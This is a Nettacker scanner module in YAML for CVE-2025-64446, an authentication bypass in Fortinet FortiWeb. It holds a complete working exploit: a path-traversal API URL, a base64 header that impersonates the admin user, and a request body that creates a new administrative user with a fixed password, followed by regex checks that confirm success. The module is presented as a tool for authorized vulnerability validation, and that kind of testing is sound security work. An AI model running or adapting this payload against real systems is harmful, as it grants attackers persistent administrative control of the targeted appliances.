info:
  name: fortiweb_auth_bypass_cve_2025_64446_vuln
  author: OWASP Nettacker Team
  severity: 9.8
  description: |
    Fortinet FortiWeb versions prior to fixed releases are vulnerable to an
    authentication bypass via relative path traversal, allowing unauthenticated
    attackers to perform administrative actions through crafted API requests.

    WARNING:
      This module is intrusive and state-modifying. Successful exploitation
      attempts to create an administrative user on the target system. Running
      this module may leave persistent artifacts, trigger security alerts, or
      modify the target configuration. Use only in authorized environments such
      as controlled testing, incident response, or vulnerability validation.

  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-64446
    - https://github.com/watchtowrlabs/watchTowr-vs-Fortiweb-AuthBypass
    - https://github.com/rapid7/metasploit-framework/pull/20698
  profiles:
    - vuln
    - http
    - critical_severity
    - cve
    - cve2025
    - fortiweb
    - auth_bypass
    - kev
  
payloads:
  - library: http
    steps:
      - method: post
        timeout: 5
        headers:
          Content-Type: "application/json"
          CGIINFO: "eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ=="
        data: |
            {{
              "data": {{
                  "q_type": 1,
                  "name": "nettacker_{scan_id}",
                  "access-profile": "prof_admin",
                  "access-profile_val": "0",
                  "last-name": "",
                  "first-name": "",
                  "email-address": "",
                  "phone-number": "",
                  "mobile-number": "",
                  "hidden": 0,
                  "comments": "",
                  "sz_dashboard": -1,
                  "type": "local-user",
                  "type_val": "0",
                  "admin-usergrp_val": "0",
                  "wildcard_val": "0",
                  "accprofile-override_val": "0",
                  "sshkey": "",
                  "trusthostv4": "127.0.0.1/8",
                  "trusthostv6": "::1/128",
                  "passwd-set-time": 0,
                  "history-password-pos": 0,
                  "history-password0": "",
                  "history-password1": "",
                  "history-password2": "",
                  "history-password3": "",
                  "history-password4": "",
                  "history-password5": "",
                  "history-password6": "",
                  "history-password7": "",
                  "history-password8": "",
                  "history-password9": "",
                  "force-password-change": "disable",
                  "force-password-change_val": "0",
                  "password": "nettacker_pass123"
              }}
            }}
        allow_redirects: false
        ssl: false
        url:
          nettacker_fuzzer:
            input_format: "{{schema}}://{target}:{{ports}}{{paths}}"
            prefix: ""
            suffix: ""
            interceptors:
            data:
              schema:
                - "http"
                - "https"
              ports:
                - 80
                - 443
              paths:
                - "/api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi"
        response:
          condition_type: and
          conditions:
            status_code:
              regex: "200"
              reverse: false
            content:
              regex: "(?s)(\"results\":).*?(\"can_clone\":)"
              reverse: false
            